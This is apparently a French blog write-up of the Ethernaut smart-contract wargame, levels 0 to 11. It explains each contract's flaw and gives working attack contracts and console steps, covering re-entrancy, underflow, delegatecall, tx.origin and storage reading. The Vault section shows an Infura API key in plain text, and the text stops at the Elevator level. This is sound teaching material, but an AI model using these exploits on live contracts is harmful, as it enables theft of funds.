---
layout: post
title: the ethernaut
categories: ctf
---
<!--more-->

---

Writeups sur l'exploitation de failles liées aux smart contracts Ethereum.

### Description

The Ethernaut is a Web3/Solidity based wargame inspired on [overthewire.org](https://overthewire.org), played in the Ethereum Virtual Machine. Each level is a smart contract that needs to be 'hacked'.

The game is 100% open source and all levels are contributions made by other players. Do you have an interesting idea? PRs are welcome at [ethernaut](https://github.com/OpenZeppelin/ethernaut).

---

## 0 - Hello Ethernaut

---

> **TL;DR**
>
> Analyser un ABI, remarquer la fonction `password()`, l'appeler pour récuper le mot de passe.

```javascript
// see contract
> await contract
...

> await contract.info()
"You will find what you need in info1()."

> await contract.info1()
"Try info2(), but with \"hello\" as a parameter."

> await contract.info2("hello")
"The property infoNum holds the number of the next info method to call."

> await contract.infoNum()
42

> await contract.info42()
"theMethodName is the name of the next method."

> await contract.theMethodName()
"The method name is method7123949."

> await contract.method7123949()
"If you know the password, submit it to authenticate()."

// we have to find a password, let's analyse the ABI
> await contract.abi
0:  Object { constant: true, name: "password", payable: false, … }
1:  Object { constant: true, name: "infoNum", payable: false, … }
2:  Object { constant: true, name: "theMethodName", payable: false, … }
3:  Object { payable: false, stateMutability: "nonpayable", type: "constructor", … }
4:  Object { constant: true, name: "info", payable: false, … }
5:  Object { constant: true, name: "info1", payable: false, … }
6:  Object { constant: true, name: "info2", payable: false, … }
7:  Object { constant: true, name: "info42", payable: false, … }
8:  Object { constant: true, name: "method7123949", payable: false, … }
9:  Object { constant: false, name: "authenticate", payable: false, … }
10: Object { constant: true, name: "getCleared", payable: false, … }

// password() function return a string :) 
> await contract.abi[0]
{ constant: true, inputs: [], name: "password", outputs: (1) […], payable: false, stateMutability: "view", type: "function" }

> await contract.password()
"ethernaut0"

> await contract.authenticate("ethernaut0")
```

Premier niveau pour se familiariser avec les interactions avec le smart contract.

> Congratulations! You have completed the tutorial. Have a look at the Solidity code for the contract you just interacted with below.
>
> You are now ready to complete all the levels of the game, and as of now, you're on your own.
>
> Godspeed!!
>
> ```javascript
> // contract
> pragma solidity ^0.5.0;
> 
> contract Instance {
> 
> string public password;
> uint8 public infoNum = 42;
> string public theMethodName = 'The method name is method7123949.';
> bool private cleared = false;
> 
> // constructor
> constructor(string memory _password) public {
>  password = _password;
> }
> 
> function info() public pure returns (string memory) {
>  return 'You will find what you need in info1().';
> }
> 
> function info1() public pure returns (string memory) {
>  return 'Try info2(), but with "hello" as a parameter.';
> }
> 
> function info2(string memory param) public pure returns (string memory) {
>  if(keccak256(abi.encodePacked(param)) == keccak256(abi.encodePacked('hello'))) {
>    return 'The property infoNum holds the number of the next info method to call.';
>  }
>  return 'Wrong parameter.';
> }
> 
> function info42() public pure returns (string memory) {
>  return 'theMethodName is the name of the next method.';
> }
> 
> function method7123949() public pure returns (string memory) {
>  return 'If you know the password, submit it to authenticate().';
> }
> 
> function authenticate(string memory passkey) public {
>  if(keccak256(abi.encodePacked(passkey)) == keccak256(abi.encodePacked(password))) {
>    cleared = true;
>  }
> }
> 
> function getCleared() public view returns (bool) {
>  return cleared;
> }
> }
> ```



---

## 1 - Fallback

---

> **TL;DR**
>
> Devenir propriétaire d'un smart contract en utilisant la fallback function.

Look carefully at the contract's code below.

You will beat this level if

1. you claim ownership of the contract
2. you reduce its balance to 0

Things that might help

- How to send ether when interacting with an ABI
- How to send ether outside of the ABI
- Converting to and from wei/ether units -see `help()` command-
- Fallback methods

```javascript
pragma solidity ^0.5.0;

import 'openzeppelin-solidity/contracts/math/SafeMath.sol';

contract Fallback {

  using SafeMath for uint256;
  mapping(address => uint) public contributions;
  address payable public owner;

  constructor() public {
    owner = msg.sender;
    contributions[msg.sender] = 1000 * (1 ether);
  }

  modifier onlyOwner {
        require(
            msg.sender == owner,
            "caller is not the owner"
        );
        _;
    }

  function contribute() public payable {
    require(msg.value < 0.001 ether);
    contributions[msg.sender] += msg.value;
    if(contributions[msg.sender] > contributions[owner]) {
      owner = msg.sender;
    }
  }

  function getContribution() public view returns (uint) {
    return contributions[msg.sender];
  }

  function withdraw() public onlyOwner {
    owner.transfer(address(this).balance);
  }

  function() payable external {
    require(msg.value > 0 && contributions[msg.sender] > 0);
    owner = msg.sender;
  }
}
```

### Analyse

```javascript
using SafeMath for uint256;
mapping(address => uint) public contributions;
address payable public owner;
```

On commence par définir 2 variables:

* `contributions`: tableau qui va associer une adresse à un entier (un solde)
* `owner`: une adresse

```javascript
constructor() public {
	owner = msg.sender;
	contributions[msg.sender] = 1000 * (1 ether);
}
```

On définit ensuite le constructeur du smart contrat. Ce dernier va initialiser la variable `owner` à l'adresse `msg.sender`.

> * `constructor()` est appelé une seule fois dans la vie d'un smart contract, lors de sa création
> * `msg.sender` correspond à l'entité ayant déployé ce smart contract sur le réseau, cela peut-être un client ou un autre smart contract

On défini ensuite `contributions[owner] = 1000 ether`. Ce qui représente une grosse somme.

```javascript
modifier onlyOwner {
    require( msg.sender == owner, "caller is not the owner" );
	_;
}
```

On définit ensuite le modifieur `onlyOwner`, un modifieur en Solidity permet d'ajouter des restrictions sur un appel à une fonction, il a un rôle similaire à un `assert` ou à un décorateur. Ce modifieur permet de s'assurer que l’émetteur de la transaction est bien l'`owner`.

```javascript
function contribute() public payable {
	require(msg.value < 0.001 ether);
	contributions[msg.sender] += msg.value;
	if(contributions[msg.sender] > contributions[owner]) {
		owner = msg.sender;
	}
}
```

On définit ensuite la fonction `contribute()`, celle-ci est `payable`, cela signifie que lors de son appel, on peut envoyer des ethers. Elle permet de réaliser une contribution dans le smart contract.

* `require(msg.value < 0.001 ether)`: limiter la valeur de la contribution à 0.001 ether par transaction
* `contributions[msg.sender] += msg.value`: contribution de l’émetteur
* `contributions[msg.sender] > contributions[owner]`: condition pour devenir `owner` du smart contract

```javascript
function getContribution() public view returns (uint) {
    return contributions[msg.sender];
}
```

Connaître notre contribution au smart contract.

```javascript
function withdraw() public onlyOwner {
	owner.transfer(address(this).balance);
}
```

Fonction qui permet de récupérer (`owner.transfer()`) tous le solde (`address(this).balance`) du smart contract. Cette fonction utilise le modifieur `onlyOwner`, seul le propriétaire peut donc récupérer tous les fonds du smart contract.

```javascript
function() payable external {
    require(msg.value > 0 && contributions[msg.sender] > 0);
    owner = msg.sender;
}
```

Cette fonction ne porte pas de nom, et est `payable`, elle correspond alors à la fonction de fallback de ce smart contract. C'est la fonction appelée lorsque aucune autre fonction n'est appelée.

> A contract can have exactly one unnamed function. This function cannot have arguments, cannot return anything and has to have `external` visibility. It is executed on a call to the contract if none of the other functions match the given function identifier (or if no data was supplied at all).

Le but va être de devenir `owner` du smart contract afin de pouvoir appeler le fonction `withdraw()`. Nous devons alors réussir à exécuter une ligne de type `owner = msg.sender`.

Utiliser `contribute()`: cela risque de prendre un peu de temps... pour passer de 0.001 à 1000 ethers, et cela nous oblige a trouver 1000 ethers.

Utiliser la fallback function: aucune protection particulière, il faudra simplement s'assurer d'avoir une contribution avant d'appeler cette fonction. On comprend alors pourquoi le challenge s'appelle **Fallback**.

### Attaque

```javascript
// we are not owner :(
> await contract.owner() == player
false

// contribution of the owner
> await contract.contributions(await contract.owner())
"10000000"

// call contribute() function with small contribution
> contract.contribute({value:toWei("0.00000001")})

// call fallback function
> contract.sendTransaction({value:toWei("0.00000001")})

// we are owner :)
> await contract.owner() == player
true

// get money
> contract.withdraw()
```

> You know the basics of how ether goes in and out of contracts, including the usage of the fallback method.
>
> You've also learnt about OpenZeppelin's Ownable contract, and how it can be used to restrict the usage of some methods to a priviledged address.
>
> Move on to the next level when you're ready!



---

## 2 - Fallout

---

> **TL;DR**
>
> Erreur sur le nom du constructeur, n'importe qui peut alors l'appeler (étant donné qu'il sera considéré comme un fonction comme les autres) !

Claim ownership of the contract below to complete this level.

 Things that might help

- Solidity Remix IDE

```javascript
pragma solidity ^0.5.0;

import 'openzeppelin-solidity/contracts/math/SafeMath.sol';

contract Fallout {
  
  using SafeMath for uint256;
  mapping (address => uint) allocations;
  address payable public owner;

  /* constructor */
  function Fal1out() public payable {
    owner = msg.sender;
    allocationsa[owner] = msg.value;
  }

  modifier onlyOwner {
	require( msg.sender == owner, "caller is not the owner" );
	_;
	    }

  function allocate() public payable {
    allocations[msg.sender] = allocations[msg.sender].add(msg.value);
  }

  function sendAllocation(address payable allocator) public {
    require(allocations[allocator] > 0);
    allocator.transfer(allocations[allocator]);
  }

  function collectAllocations() public onlyOwner {
    msg.sender.transfer(address(this).balance);
  }

  function allocatorBalance(address allocator) public view returns (uint) {
    return allocations[allocator];
  }
}
```

### Analyse

```javascript
/* constructor */
function Fal1out() public payable {
    owner = msg.sender;
    allocationsa[owner] = msg.value;
}
```

Ce code est censé jouer le rôle de constructeur du smart contract sauf que le nom de la fonction ne correspond pas exactement au nom du contrat, le lettre `l` a été remplacée par un `1`. Cette fonction n'est donc pas le constructeur du smart contract, c'est alors une fonction comme les autres, appelable par n'importe qui.

Nous allons simplement appeler la fonction `Fal1out()` pour devenir `owner`.

### Attaque

```javascript
> contract.owner() == player
false

> contract.Fal1out()

> await contract.owner() == player
true
```

> That was silly wasn't it? Real world contracts must be much more  secure than this and so must it be much harder to hack them right?
>
> Well... Not quite.
>
> The story of Rubixi is a very well known case in the Ethereum ecosystem.  The company changed its name from 'Dynamic Pyramid' to 'Rubixi' but  somehow they didn't rename the constructor method of its contract:
>
> ```javascript
> contract Rubixi {
> address private owner;
> function DynamicPyramid() { owner = msg.sender; }
> function collectAllFees() { owner.transfer(this.balance) }
> ...
> ```
>
> This allowed the attacker to call the old constructor  and claim ownership of the contract, and steal some funds. Yep. Big mistakes can be made in smartcontractland.



---

## 3 - Coin Flip

---

> **TL;DR**
>
> Utilisation d'aléa basé sur des données prédictibles (`block.number`).

This is a coin flipping game where you need to build up your winning  streak by guessing the outcome of a coin flip. To complete this level  you'll need to use your psychic abilities to guess the correct outcome  10 times in a row.

```javascript
pragma solidity ^0.5.0;

import 'openzeppelin-solidity/contracts/math/SafeMath.sol';

contract CoinFlip {

  using SafeMath for uint256;
  uint256 public consecutiveWins;
  uint256 lastHash;
  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

  constructor() public {
    consecutiveWins = 0;
  }

  function flip(bool _guess) public returns (bool) {
    uint256 blockValue = uint256(blockhash(block.number.sub(1)));

    if (lastHash == blockValue) {
      revert();
    }

    lastHash = blockValue;
    uint256 coinFlip = blockValue.div(FACTOR);
    bool side = coinFlip == 1 ? true : false;

    if (side == _guess) {
      consecutiveWins++;
      return true;
    } else {
      consecutiveWins = 0;
      return false;
    }
  }
}
```

### Analyse

Ce smart contract définit un jeu dans lequel il faut deviner la valeur qui sera tirée à chaque appel à `flip()`. La but est de deviner correctement les valeurs sur 10 tirages d'affilés.

```javascript
function flip(bool _guess) public returns (bool) {
	uint256 blockValue = uint256(blockhash(block.number.sub(1)));

	if (lastHash == blockValue) {
		revert();
	}

	lastHash = blockValue;
    uint256 coinFlip = blockValue.div(FACTOR);
    bool side = coinFlip == 1 ? true : false;

	if (side == _guess) {
		consecutiveWins++;
		return true;
	} else {
		consecutiveWins = 0;
		return false;
	}
}
```

La fonction `flip()` réalise un tirage à partir de `block.number` puis le divise par la constante `FACTOR` et compare le résultat à `1`.

```javascript
uint256 blockValue = uint256(blockhash(block.number.sub(1)));
```

Le problème est que `block.number` est une variable globale, accessible depuis n'importe quel smart contract (si 2 transactions sont dans le même bloc, alors, ces dernières partageront le même `block.number`).

### Attaque

Nous allons alors simplement créer un smart contract et effectuer des tirages pour deviner en avance la valeur attendue puis appeler le fonction `flip()` avec la bonne valeur et ainsi incrémenter `consecutiveWins` tirages après tirages.

```javascript
contract Attack {

  using SafeMath for uint256;
  CoinFlip public object;
  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

  function Attack() public {
    object = CoinFlip(0xaef3e3239f3724758f721c93767039c98362d7bb);
  }

  function go() public returns (bool) {
    uint256 blockValue = uint256(block.blockhash(block.number.sub(1)));
    uint256 coinFlip = blockValue.div(FACTOR);
    
    bool side = coinFlip == 1 ? true : false;
    bool result = object.flip(side);
    
    return true;
  }
}
```

```javascript
> await contract.consecutiveWins()
0

// execute 10 times go() function from Attack contract

> await contract.consecutiveWins()
10
```

> Generating random numbers in solidity can be tricky. There currently  isn't a native way to generate them, and everything you use in smart  contracts is publicly visible, including the local variables and state  variables marked as private. Miners also have control over things like  blockhashes, timestamps, and whether to include certain transactions -  which allows them to bias these values in their favor.
>
> Some options include using Bitcoin block headers (verified through [BTC Relay](http://btcrelay.org)), [RANDAO](https://github.com/randao/randao), or [Oraclize](http://www.oraclize.it/)).



---

## 4 - Telephone

---

> **TL;DR**
>
> Différencier `msg.sender` et `tx.origin`.

Claim ownership of the contract below to complete this level.

Things that might help

- See the Help page above, section "Beyond the console"

```javascript
pragma solidity ^0.5.0;

contract Telephone {

  address public owner;

  constructor() public {
    owner = msg.sender;
  }

  function changeOwner(address _owner) public {
    if (tx.origin != msg.sender) {
      owner = _owner;
    }
  }
}
```

### Analyse

Le but de ce niveau est de devenir `owner`.

```javascript
if (tx.origin != msg.sender) {
    owner = _owner;
}
```

Pour cela, il faut que `tx.origin != msg.sender`. Après quelques recherches on tombe sur:

> With `msg.sender`: the owner can be a contract.
>
> With `tx.origin`: the owner can never be a contract.
>
> In a simple call chain A->B->C, inside C `msg.sender` will be B, and `tx.origin` will be A.

Nous devons alors simplement appeler la fonction `changeOwner()` depuis un autre smart contract pour respecter le condition.

### Attaque

```javascript
contract Attack {

  address public attacker;
  Telephone object;

  constructor() public {
    attacker = msg.sender;
    object = Telephone(0xe927cee2e1A0006Eb230e40C505FD09eA1AebD1b);
  }

  function go() public {
    object.changeOwner(attacker);
  }
}
```

```javascript
// we are not owner
> await contract.owner() == player
false

// get contract address
> contract.address
"0xa0783bd88924164fecb1aa02858effe62c081e4f"

// we are owner !
> await contract.owner() == player
true
```

> While this example may be simple, confusing `tx.origin` with `msg.sender` can lead to phishing-style attacks, such as [this](https://blog.ethereum.org/2016/06/24/security-alert-smart-contract-wallets-created-in-frontier-are-vulnerable-to-phishing-attacks/).
>
> An example of a possible attack is outlined below.
>
> 1. Use `tx.origin` to determine whose tokens to transfer, e.g.
>
> ```
> function transfer(address _to, uint _value) {
>   tokens[tx.origin] -= _value;
>   tokens[_to] += _value;
> }
> ```
>
> 1. Attacker gets victim to send funds to a malicious contract that calls the transfer function of the token contract, e.g.
>
> ```
> function () payable {
>   token.transfer(attackerAddress, 10000);
> }
> ```
>
> 1. In this scenario, `tx.origin` will be the victim's address (while `msg.sender` will be the malicious contract's address), resulting in the funds being transferred from the victim to the attacker.



---

## 5 - Token

---

> **TL;DR**
>
> Réalisation d'un underflow sur une opération non protégée. Ce qui permet alors d'avoir un solde maximal.

The goal of this level is for you to hack the basic token contract below.

You are given 20 tokens to start with and you will beat the level if you somehow manage to get your hands on any additional tokens. Preferably a very large amount of tokens.

 Things that might help:

- What is an odometer?

```javascript
pragma solidity ^0.5.0;

contract Token {

  mapping(address => uint) balances;
  uint public totalSupply;

  constructor(uint _initialSupply) public {
    balances[msg.sender] = totalSupply = _initialSupply;
  }

  function transfer(address _to, uint _value) public returns (bool) {
    require(balances[msg.sender] - _value >= 0);
    balances[msg.sender] -= _value;
    balances[_to] += _value;
    return true;
  }

  function balanceOf(address _owner) public view returns (uint balance) {
    return balances[_owner];
  }
}
```

### Analyse

Ce smart contract permet de gérer des transferts entre les comptes des clients. La fonction `tranfert()` permet de réaliser une transaction, la fonction `balanceOf()` permet de consulter le solde d'un compte.

```javascript
function transfer(address _to, uint _value) public returns (bool) {
    require(balances[msg.sender] - _value >= 0);
    balances[msg.sender] -= _value;
    balances[_to] += _value;
    return true;
}
```

On peut voir que la fonction effectue plusieurs opérations sans faire attention à des vulnérabilités de type, overflow ou underflow. Nous allons exploiter un underflow pour passer le `require(balances[msg.sender] - _value >= 0)`.

Si le solde de notre compte est de 20 et que l'on veut transférer 21, alors le `require()` va réaliser le calcul suivant: `21-20 = -1`. Sauf que le `-1` va être représenté comme le plus grand entier possible ! Grâce à cela, nous pouvons passer la contrainte du `require()`.

```javascript
balances[msg.sender] -= _value;
```

La ligne ci-dessus est alors exécutée, et le solde de notre compte prend également la valeur maximale !

### Attaque

Nous allons réaliser un transfert à une adresse quelconque, nous prendrons `contract.address` pour notre attaque. Notre transfert doit être supérieur à 20 pour réaliser l'underflow, nous prendrons 21.

```javascript
// exploit uderflow
> await contract.transfer(contract.address,21)

> await contract.balanceOf(player)
```

> Overflows are very common in solidity and must be checked for with control statements such as:
>
> ```
> if(a + c > a) {
> a = a + c;
> }
> ```
>
> An easier alternative is to use OpenZeppelin's SafeMath  library that automatically checks for overflows in all the mathematical  operators. The resulting code looks like this:
>
> ```
> a = a.add(c);
> ```
>
> If there is an overflow, the code will revert.



---

## 6 - Delegation

---

> **TL;DR**
>
> Exploiter un appel à un `delegatecall` afin de modifier des variables du contexte courant.

The goal of this level is for you claim ownership of the instance you are given.

 Things that might help

- Look into Solidity's documentation on the `delegatecall` low level function, how it works, how it can be used to delegate operations to on-chain libraries, and what implications it has on  execution scope.
- Fallback methods
- Method ids

```javascript
pragma solidity ^0.5.0;

contract Delegate {

  address public owner;

  constructor(address _owner) public {
    owner = _owner;
  }

  function pwn() public {
    owner = msg.sender;
  }
}

contract Delegation {

  address public owner;
  Delegate delegate;

  constructor(address _delegateAddress) public {
    delegate = Delegate(_delegateAddress);
    owner = msg.sender;
  }

  function() external {
    (bool result, bytes memory data) = address(delegate).delegatecall(msg.data);
    if (result) {
      this;
    }
  }
}
```

### Analyse

Ce niveau est composé de 2 smart contacts.

```javascript
contract Delegate {

  address public owner;

  constructor(address _owner) public {
    owner = _owner;
  }

  function pwn() public {
    owner = msg.sender;
  }
}
```

`Delegate` possède une variable `owner`, qui est initialisée dans le constructeur. Il possède également la fonction `pwn()` qui permet de changer la valeur de `owner`.

```javascript
contract Delegation {

  address public owner;
  Delegate delegate;

  constructor(address _delegateAddress) public {
    delegate = Delegate(_delegateAddress);
    owner = msg.sender;
  }

  function() external {
    (bool result, bytes memory data) = address(delegate).delegatecall(msg.data);
    if (result) {
      this;
    }
  }
}
```

`Delegation` possède une variable `owner` ainsi qu'une instance de `Delegate`. Ces derniers sont initialisés dans le constructeur. Il définit également une fallback function qui réalise un `delegatecall()` vers l'instance de `Delegate`.

> There exists a special variant of a message call, named **delegatecall** which is identical to a message call apart from the fact that the code at the target address is executed in the context of the calling contract and `msg.sender` and `msg.value` do not change their values.
>
> This means that a contract can dynamically load code from a different address at runtime. Storage, current address and balance still refer to the calling contract, only the code is taken from the called address.
>
> This makes it possible to implement the “library” feature in Solidity: Reusable library code that can be applied to a contract’s storage, e.g. in order to  implement a complex data structure.

Un `delegatecall` permet d'exécuter du code externe dans le contexte courant du smart contract appelant. Pour devenir `owner`, nous devons appeler le fonction `pwn()` qui va modifier la valeur de `owner`.

### Attaque

La fonction a appeler doit être dans `msg.data`.

```javascript
// we are not owner
> await contract.owner() == player
false

// call pwn()
> await contract.sendTransaction({data:web3.sha3("pwn()")})

// we are owner
> await contract.owner() == player
true
```

> Usage of `delegatecall` is particularly risky and has been used as an attack vector on multiple historic hacks. With it, your  contract is practically saying "here, -other contract- or -other  library-, do whatever you want with my state". Delegates have complete  access to your contract's state. The `delegatecall` function is a powerful feature, but a dangerous one, and must be used with extreme care.
>
> Please refer to the [The Parity Wallet Hack Explained](https://blog.openzeppelin.com/on-the-parity-wallet-multisig-hack-405a8c12e8f7) article for an accurate explanation of how this idea was used to steal 30M USD.



---

## 7 - Force

---

> **TL;DR**
>
> On force un smart contrat a recevoir des ether en appelant `selfdestruct` d'un autre smart contract.

Some contracts will simply not take your money `¯\_(ツ)_/¯`

The goal of this level is to make the balance of the contract greater than zero.

 Things that might help:

- Fallback methods
- Sometimes the best way to attack a contract is with another contract.
- See the Help page above, section "Beyond the console"

```javascript
pragma solidity ^0.5.0;

contract Force {/*

                   MEOW ?
         /\_/\   /
    ____/ o o \
  /~____  =ø= /
 (______)__m_m)

*/}
```

### Analyse

Pas grand chose à dire, puisqu'il n'y a rien.

Pour réussir ce challenge, nous devons augmenter le solde du smart contract. Nous devons réussir à augmenter son solde.

> **Can a contract with no payable function have ether ?**
>
> Yes, a contract can have Ether balance without any `payable` function.
>
> There are three ways to do it:
>
> 1) selfdestruction. Another contract self destructs and sends its remaining Ether to your contract
>
> 2) Target of mining. Ether rewarded from mining can't be refused.
>
> 3) Ether sent to the contract before the contract exists.
>
> More details about these alternatives can found for example here: https://medium.com/@alexsherbuck/two-ways-to-force-ether-into-a-contract-1543c1311c56

Nous allons alors créer un smart contract, lui envoyer des ethers, puis appeler la fonction `selfdestruct()` qui va détruire notre smart contract et envoyer nos ether à notre cible. 

> The only way to remove code from the blockchain is when a contract at that address performs the `selfdestruct` operation. The remaining Ether stored at that address is sent to a  designated target and then the storage and code is removed from the  state. Removing the contract in theory sounds like a good idea, but it  is potentially dangerous, as if someone sends Ether to removed  contracts, the Ether is forever lost.

### Attaque

Notre smart contract va recevoir des ether, puis on appel la fonction `kill()`.

```javascript
contract Attack {
    
    uint256 public money;
    
    constructor() public payable {
        money = money + msg.value;
    }
    
    function kill() public payable {
        selfdestruct(0xa4d6d05221c2c11b467a9a916d1a867386f2978a);
    }
}
```

```javascript
> await getBalance(contract.address)
"0"

> await getBalance(contract.address)
"0.000000000000000001"
```

> In solidity, for a contract to be able to receive ether, the fallback function must be marked 'payable'.
>
> However, there is no way to stop an attacker from sending ether to a contract by self destroying. Hence, it is important not to count on the invariant `this.balance == 0` for any contract logic.



---

## 8 - Vault

---

> **TL;DR**
>
> Lire un mot de passe présent sur le slot numéro 1 en utilisant `myth`.

Unlock the vault to pass the level!

```javascript
pragma solidity ^0.5.0;

contract Vault {
  bool public locked;
  bytes32 private password;

  constructor(bytes32 _password) public {
    locked = true;
    password = _password;
  }

  function unlock(bytes32 _password) public {
    if (password == _password) {
      locked = false;
    }
  }
}
```

### Analyse

Ce smart contract est assez simple à comprendre. Le constructeur permet de locker le contrat avec un mot de passe. Pour unlocker ce dernier, il faut connaître le mot de passe.

> [Smart contract storage](https://programtheblockchain.com/posts/2018/03/09/understanding-ethereum-smart-contract-storage/)

Le mot de passe contenu dans `password` est dans le slot 2 du smart contract. Pour lire le contenu de ce slot 2, nous allons utiliser [mythril](https://github.com/ConsenSys/mythril). C'est un outil qui peut permettre de lire les slots d'un smart contract.

### Attaque

> **Obtenir un INFURA_ID**
>
> Avant de pouvoir utiliser `mythril` il faut récupérer un `infura_id`, c'est une sorte de clé d'API:
>
> * créer un compte sur `https://infura.io/register`
> * créer un projet
> * récupérer l'`API key` ou le `PROJECT ID`

```bash
# slot 0
$ docker run -it --net=host -e INFURA_ID=ceb5f54c0bff4da6919aa26300f5bedd mythril/myth read-storage --rpc infura-ropsten 0 0x1D9EDF73319C88C52680F875909B42C53216B5C0
# INFURA_ID=ceb5f...: our API key
# read-storage: retrieves storage slots from a given address through rpc
# --rpc infura-ropsten: use ropsten network
# 0: read slot 0
# 0x1D9: contract address
0: 0x0000000000000000000000000000000000000000000000000000000000000001


# slot 1
$ docker run -it --net=host -e INFURA_ID=ceb5f54c0bff4da6919aa26300f5bedd mythril/myth read-storage --rpc infura-ropsten 1 0x1D9EDF73319C88C52680F875909B42C53216B5C0
1: 0x412076657279207374726f6e67207365637265742070617373776f7264203a29

# other method to read
> await web3.eth.getStorageAt("0x1D9EDF73319C88C52680F875909B42C53216B5C0",0)
> await web3.eth.getStorageAt("0x1D9EDF73319C88C52680F875909B42C53216B5C0",1)
```

On peut essayer de décoder la valeur du slot 2: `0x412076657279207...`:

```bash
$ python3
> import binascii as ba
> ba.unhexlify('412076657279207374726f6e67207365637265742070617373776f7264203a29')
b'A very strong secret password :)'
```

```javascript
> await contract.locked()
true

// 2 different ways
> await contract.unlock("0x412076657279207374726f6e67207365637265742070617373776f7264203a29")
> await contract.unlock(web3.utils.fromAscii("A very strong secret password :)"))

> await contract.locked()
false
```

> [Decompile smart contract](https://ropsten.etherscan.io/bytecode-decompiler?a=0x1D9EDF73319C88C52680F875909B42C53216B5C0)

> It's important to remember that marking a variable as private only  prevents other contracts from accessing it. State variables marked as  private and local variables are still publicly accessible.
>
> To  ensure that data is private, it needs to be encrypted before being put  onto the blockchain. In this scenario, the decryption key should never  be sent on-chain, as it will then be visible to anyone who looks for it. [zk-SNARKs](https://blog.ethereum.org/2016/12/05/zksnarks-in-a-nutshell/) provide a way to determine whether someone possesses a secret parameter, without ever having to reveal the parameter.



---

## 9 - King

---

> **TL;DR**
>
> Garder le propriété d'un smart contract, empêcher les autres acheteurs de l'acheter en ajoutant un `revert()` dans la fallback function de notre contrat (qui est le propriétaire).

The contract below represents a very simple game: whoever sends it an amount of ether that is larger than the current prize becomes the new  king. On such an event, the overthrown king gets paid the new prize,  making a bit of ether in the process! As ponzi as it gets xD

Such a fun game. Your goal is to break it.

When you submit the instance back to the level, the level is going to  reclaim kingship. You will beat the level if you can avoid such a self  proclamation.

```javascript
pragma solidity ^0.5.0;

contract King {

  address payable king;
  uint public prize;
  address payable public owner;

  constructor() public payable {
    owner = msg.sender;  
    king = msg.sender;
    prize = msg.value;
  }

  function() external payable {
    require(msg.value >= prize || msg.sender == owner);
    king.transfer(msg.value);
    king = msg.sender;
    prize = msg.value;
  }

  function _king() public view returns (address payable) {
    return king;
  }
}
```

### Analyse

Le but de ce smart contract est de simuler une sorte de mise aux enchéres, à chaque fois que l'on propose un prix supérieur au prix actuel, on devient propriétaire.

```javascript
> await contract.prize()
1000000000000000000 // 1 ether
```

Il est facile de devenir propriétaire, mais pas de le rester. La but va être de bloquer `king.transfer(msg.value)`. Cette instruction est censée donner les ethers à l'ancien propriétaire avant que le nouveau ne soit mit en place.

Imaginons que `king` est un autre smart contract et non un vrai utilisateur. Dans ce cas, lorsque `king.transfer(msg.value)` sera appelée, c'est la fallback function qui sera exécutée.

Pour ne pas autoriser la réception d'ether sur un smart contract nous allons utiliser `revert()` dans notre fallback function !

### Attaque

Nous allons déployer ce smart contract avec 1.1 ether.

```javascript
contract Attack {

    constructor(address addr) public payable {
        (bool result, bytes memory data) = addr.call.value(msg.value)("");
    }

    function () external payable {
        revert("nop");
    }
}
```

> Most of Ethernaut's levels try to expose (in an oversimpliefied form  of course) something that actually happend. A real hack or a real bug.
>
> In this case, see: [King of the Ether](https://www.kingoftheether.com/thrones/kingoftheether/index.html) and [King of the Ether Postmortem](http://www.kingoftheether.com/postmortem.html)



---

## 10 - Re-entrancy

---

> **TL;DR**
>
> Du classique: re-entrancy attack !

The goal of this level is for you to steal all the funds from the contract.

 Things that might help:

- Untrusted contracts can execute code where you least expect it.
- Fallback methods
- Throw/revert bubbling
- Sometimes the best way to attack a contract is with another contract.
- See the Help page above, section "Beyond the console"

```javascript
pragma solidity ^0.5.0;

import 'openzeppelin-solidity/contracts/math/SafeMath.sol';

contract Reentrance {
  
  using SafeMath for uint256;
  mapping(address => uint) public balances;

  function donate(address _to) public payable {
    balances[_to] = balances[_to].add(msg.value);
  }

  function balanceOf(address _who) public view returns (uint balance) {
    return balances[_who];
  }

  function withdraw(uint _amount) public {
    if(balances[msg.sender] >= _amount) {
      (bool result, bytes memory data) = msg.sender.call.value(_amount)("");
      if(result) {
        _amount;
      }
      balances[msg.sender] -= _amount;
    }
  }

  function() external payable {}
}
```

### Analyse

Nous avons à faire à un smart contract qui peut-être attaqué avec une Re-entrancy attack. De bonnes ressources sont disponibles sur internet.

Ce type de faille est facilement reconnaissable avec ces types d'appels:

 ```javascript
msg.sender.call.value(_amount)("");
if(msg.sender.call.value(_amount)());
 ```

### Attaque

```javascript
contract Attack {
    Reentrance public original;
    
    constructor(address payable addr) public payable {
        original = Reentrance(addr);
    }
    
    function go() public payable {
        original.donate.value(1 ether)(address(this));
        original.withdraw(1 ether);
    }
    
    function() external payable {
        original.withdraw(1 ether);
    }
}
```

> In order to prevent re-entrancy attacks when moving funds out of your contract, use the [Checks-Effects-Interactions pattern](https://solidity.readthedocs.io/en/develop/security-considerations.html#use-the-checks-effects-interactions-pattern) being aware that `call` will only return false without interrupting the execution flow. Solutions such as [ReentrancyGuard](https://docs.openzeppelin.com/contracts/2.x/api/utils#ReentrancyGuard) or [PullPayment](https://docs.openzeppelin.com/contracts/2.x/api/payment#PullPayment) can also be used.
>
> `transfer` and `send` are no longer recommended solutions as they can potentially break contracts after the Istanbul hard fork [Source 1](https://diligence.consensys.net/blog/2019/09/stop-using-soliditys-transfer-now/) [Source 2](https://forum.openzeppelin.com/t/reentrancy-after-istanbul/1742).
>
> Always assume that the receiver of the funds you are sending can be another  contract, not just a regular address. Hence, it can execute code in its  payable fallback method and *re-enter* your contract, possibly messing up your state/logic.
>
> Re-entrancy is a common attack. You should always be prepared for it!
>
> #### The DAO Hack
>
> The famous DAO hack used reentrancy to extract a huge amount of ether from the victim contract. See [15 lines of code that could have prevented TheDAO Hack](https://blog.openzeppelin.com/15-lines-of-code-that-could-have-prevented-thedao-hack-782499e00942).



---

## 11 - Elevator

---

> **TL;DR**
>
> Contrôler une fonction pour modifier le cheminement.

This elevator won't let you reach the top of your building. Right?

##### Things that might help:

- Sometimes solidity is not good at keeping promises.
- This `Elevator` expects to be used from a `Building`.

```javascript
pragma solidity ^0.5.0;

interface Building {
  function isLastFloor(uint) external returns (bool);
}

contract Elevator {
  bool public top;
  uint public floor;

  function goTo(uint _floor) public {
    Building building = Building(msg.sender);

    if (! building.isLastFloor(_floor)) {
      floor = _floor;
      top = building.isLastFloor(floor);
    }
  }
}
```

### Analyse

